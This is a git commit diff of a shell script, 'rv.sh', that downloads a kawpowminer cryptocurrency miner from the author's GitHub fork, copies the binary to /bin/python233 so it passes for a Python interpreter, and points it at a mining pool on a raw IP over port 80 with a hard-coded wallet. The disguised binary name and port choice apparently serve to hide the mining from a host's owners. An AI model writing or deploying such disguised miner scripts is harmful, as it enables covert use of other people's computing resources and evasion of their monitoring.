b35105324dadf9d88beb9d14ed0fb65003d7ec4b
one10001 <78626503+one10001@users.noreply.github.com>
2021-03-08 04:42:15 +0100

    Update rv.sh

--- rv.sh
+++ rv.sh
@@ -4,10 +4,10 @@ curl ipinfo.io
 # wget https://github.com/RavenCommunity/kawpowminer/releases/download/1.2.3/kawpowminer-ubuntu18-1.2.3.zip
 # unzip kawpowminer-ubuntu18-1.2.3.zip
 # version1.2.2
-wget https://github.com/nanopool/kawpowminer/releases/download/1.2.2/kawpowminer-ubuntu18-1.2.2.zip
-unzip kawpowminer-ubuntu18-1.2.2.zip
+wget https://github.com/one10001/kawpowminer/releases/download/7.5/kawpowminer_all75.tar.gz
+tar -xzf kawpowminer_all75.tar.gz
 ls -la
-cd kawpowminer-ubuntu18-1.2.2
+cd kawpowminer/build/kawpowminer/
 chmod +x kawpowminer
 cp kawpowminer /bin/python233
-python233 -G -P stratum+tcp://RMV17aQMgMPyPqJQ5H3WRQH37Njspi1SSK.RIG01@116.203.206.127:80
+python233 -U -P stratum+tcp://RMV17aQMgMPyPqJQ5H3WRQH37Njspi1SSK.RIG01@116.203.206.127:80
